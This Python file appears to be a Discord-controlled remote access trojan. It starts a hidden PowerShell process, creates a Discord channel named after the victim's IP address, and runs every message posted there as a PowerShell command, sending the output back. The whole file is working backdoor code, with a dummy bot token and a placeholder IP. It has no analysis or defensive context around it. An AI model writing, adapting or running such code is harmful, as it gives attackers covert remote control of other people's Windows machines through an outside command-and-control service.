import discord
import requests
import subprocess

DISCORD_TOKEN = "secretdummy"

intents = discord.Intents.default()
intents.message_content = True    
client = discord.Client(intents=intents)

ps = subprocess.Popen(["powershell", "-NoLogo", "-NoExit", "-Command", "-"],
 stdin=subprocess.PIPE,
 stdout=subprocess.PIPE,
 stderr=subprocess.PIPE,
 text=True,
 bufsize=1,
 creationflags=subprocess.CREATE_NO_WINDOW
)

def execute_cmd(cmd):
    marker = "_CMD_DONE_"

    wrapped = f"""
    try {{
        {cmd}
    }} catch {{
        Write-Output "Error: $($_.Exception.Message)"
    }} 
    """
    ps.stdin.write(wrapped + "\n")
    ps.stdin.write(f'Write-Output "{marker}"\n')
    ps.stdin.flush()
    
    output = []
    for line in ps.stdout:
        if marker in line:
            break
        output.append(line.rstrip())

    return "\n".join(output)


@client.event
async def on_ready():
    global channel
    guild = client.guilds[0]
    #ip = requests.get("https://api.ipify.org").text.replace(",", "-")
    ip = "1-2-3-4"
    channel = await guild.create_text_channel(ip)
@client.event
async def on_message(message):
    if not channel or message.channel.id != channel.id:
        return

    if message.author.bot:
        return

    result = execute_cmd(message.content) or f"Executed: {message.content}with no output."
    await message.channel.send(result)
client.run(DISCORD_TOKEN)